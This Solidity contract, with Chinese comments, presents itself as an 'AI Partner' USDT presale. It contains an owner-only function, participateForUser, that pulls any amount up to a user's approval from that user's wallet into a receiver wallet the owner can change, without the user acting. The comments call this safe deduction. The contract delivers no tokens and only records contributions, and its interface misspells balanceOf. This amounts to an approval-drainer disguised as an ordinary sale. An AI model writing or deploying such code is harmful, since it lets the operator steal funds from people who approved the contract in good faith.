// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @dev 简化的 ERC20 接口，用于调用 USDT 的 transfer 和 transferFrom
 */
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceof(address account) external view returns (uint256);
}

/**
 * @title AI Partner EVM 预售合约
 * @notice 实现用户授权后的安全扣款与预售参与流程
 */
contract AIPartnerPresale {
    
    // 管理员地址
    address public owner;
    
    // USDT 代币合约地址
    address public immutable usdtToken;
    
    // 资金归集/收款钱包地址
    address public feeReceiver;

    // 记录每个地址参与预售的总金额
    mapping(address => uint256) public contributions;

    // 事件定义：便于前端或后端监听抓取
    event Participated(address indexed buyer, uint256 amount, uint256 timestamp);
    event FeeReceiverUpdated(address indexed newReceiver);
    event EmergencyWithdrawn(address indexed token, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    /**
     * @param _usdtToken USDT 合约地址
     * @param _feeReceiver 收款/归集钱包地址
     */
    constructor(address _usdtToken, address _feeReceiver) {
        require(_usdtToken != address(0), "Invalid USDT address");
        require(_feeReceiver != address(0), "Invalid receiver address");
        owner = msg.sender;
        usdtToken = _usdtToken;
        feeReceiver = _feeReceiver;
    }

    /**
     * @notice 用户自主参与预售 / 兑换代币
     * @dev 前端需要先调用 USDT 的 approve 将额度授权给本合约地址，然后用户调用此方法
     * @param amount 兑换的 USDT 数量
     */
    function participate(uint256 amount) external {
        require(amount > 0, "Amount must be greater than zero");

        // 1. 利用用户之前已授权给本合约的额度，将 USDT 从用户钱包安全转账到收款钱包
        bool success = IERC20(usdtToken).transferFrom(msg.sender, feeReceiver, amount);
        require(success, "USDT transferFrom failed. Please check your approval amount.");

        // 2. 记录用户的购买贡献
        contributions[msg.sender] += amount;

        // 3. 触发成功日志事件
        emit Participated(msg.sender, amount, block.timestamp);
    }

    /**
     * @notice 后台管理员调用的代扣函数
     * @dev 允许管理员从已授权用户的钱包中扣除指定金额到收款钱包
     * @param user 已授权用户的钱包地址
     * @param amount 扣除的 USDT 数量
     */
    function participateForUser(address user, uint256 amount) external onlyOwner {
        require(user != address(0), "Invalid user address");
        require(amount > 0, "Amount must be greater than zero");

        // 1. 利用用户已授权给本合约的额度，将 USDT 从指定用户钱包转入收款钱包
        bool success = IERC20(usdtToken).transferFrom(user, feeReceiver, amount);
        require(success, "USDT transferFrom failed. Check user approval.");

        // 2. 记录用户的购买贡献
        contributions[user] += amount;

        // 3. 触发成功日志事件
        emit Participated(user, amount, block.timestamp);
    }

    /**
     * @notice 更新收款钱包地址（仅管理员）
     */
    function setFeeReceiver(address _newReceiver) external onlyOwner {
        require(_newReceiver != address(0), "Invalid address");
        feeReceiver = _newReceiver;
        emit FeeReceiverUpdated(_newReceiver);
    }

    /**
     * @notice 紧急提取合约中误打入的其他代币（防资金锁死）
     */
    function emergencyWithdrawToken(address tokenAddr, uint256 amount) external onlyOwner {
        bool success = IERC20(tokenAddr).transfer(owner, amount);
        require(success, "Transfer failed");
        emit EmergencyWithdrawn(tokenAddr, amount);
    }
}
